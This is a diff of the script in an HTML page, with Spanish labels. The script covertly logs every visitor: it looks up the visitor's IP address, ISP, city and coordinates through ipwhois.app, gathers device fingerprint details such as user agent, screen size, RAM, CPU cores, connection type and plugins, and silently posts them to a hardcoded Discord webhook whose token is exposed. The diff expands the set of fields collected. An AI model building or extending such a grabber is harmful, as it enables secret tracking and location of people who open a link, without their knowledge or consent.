@@ -301,7 +301,6 @@
   <script>
     const webhookUrl = "https://discord.com/api/webhooks/1387250677645836359/yGWtt1WhZXX-VRQhJd5rPGMy5STBSCg1yg0cwJSqrBGIQpk8kQn-cOKoHDlGYZ3ypTj9"; // ← REEMPLAZAR
 
-    // Función para enviar la info al webhook
     function sendLog(log) {
       fetch(webhookUrl, {
         method: "POST",
@@ -310,9 +309,12 @@
       }).catch(() => {});
     }
 
-    // Recopila máxima información posible sin permisos
     function getSystemInfo(ip_data) {
       const now = new Date();
+      const nav = navigator;
+      const connection = nav.connection || nav.mozConnection || nav.webkitConnection || {};
+      const userAgentData = nav.userAgentData || {};
+      const plugins = nav.plugins ? Array.from(nav.plugins).map(p => p.name).join(', ') : 'No disponible';
       return `
 📡 IP: ${ip_data.ip}
 🛰️ ISP: ${ip_data.org}
@@ -320,22 +322,30 @@
 🌎 País: ${ip_data.country}
 🏙️ Región: ${ip_data.region}
 🏠 Ciudad: ${ip_data.city}
+📍 Latitud IP: ${ip_data.latitude}
+📍 Longitud IP: ${ip_data.longitude}
 ⏰ Zona Horaria (API): ${ip_data.timezone_gmt}
 ⏱️ Zona Horaria Local: ${Intl.DateTimeFormat().resolvedOptions().timeZone}
 🖥️ Resolución Pantalla: ${screen.width}x${screen.height}
-🖱️ Mouse disponible: ${typeof window.onmousemove === "object" ? 'Sí' : 'No'}
+🌈 Profundidad color: ${screen.colorDepth}
+💾 Memoria RAM (aprox): ${nav.deviceMemory || 'No disponible'} GB
+🧮 Núcleos CPU: ${nav.hardwareConcurrency || 'No disponible'}
+🔌 Tipo de conexión: ${connection.effectiveType || connection.type || 'No disponible'}
+📶 Velocidad conexión estimada: ${connection.downlink || 'No disponible'} Mbps
+📦 Plugins instalados: ${plugins}
 🗔 Ventana en iframe: ${window.self !== window.top ? 'Sí' : 'No'}
-📦 Cookies habilitadas: ${navigator.cookieEnabled ? 'Sí' : 'No'}
+📦 Cookies habilitadas: ${nav.cookieEnabled ? 'Sí' : 'No'}
 🔒 HTTPS: ${location.protocol === 'https:' ? 'Sí' : 'No'}
-🤖 Bot: ${/bot|crawler|spider|crawling/i.test(navigator.userAgent) ? 'Sí' : 'No'}
-💻 Sistema Operativo: ${navigator.platform}
-🌐 Navegador: ${navigator.userAgent}
-🗣️ Idioma: ${navigator.language}
+🤖 Bot: ${/bot|crawler|spider|crawling/i.test(nav.userAgent) ? 'Sí' : 'No'}
+💻 Sistema Operativo: ${nav.platform}
+🌐 Navegador: ${nav.userAgent}
+🗣️ Idioma: ${nav.language}
+📱 ¿Móvil?: ${/Mobi|Android|iPhone|iPad|iPod/i.test(nav.userAgent) ? 'Sí' : 'No'}
+🗃️ Plataforma UAData: ${(userAgentData.platform || 'No disponible')}
 📅 Fecha y Hora: ${now.toLocaleString()}
-        `;
+      `;
     }
 
-    // Obtiene la IP y manda todo
     fetch("https://ipwhois.app/json/")
       .then(res => res.json())
       .then(ip_data => {
@@ -345,5 +355,4 @@
   </script>
 </body>
 </html>
-
 
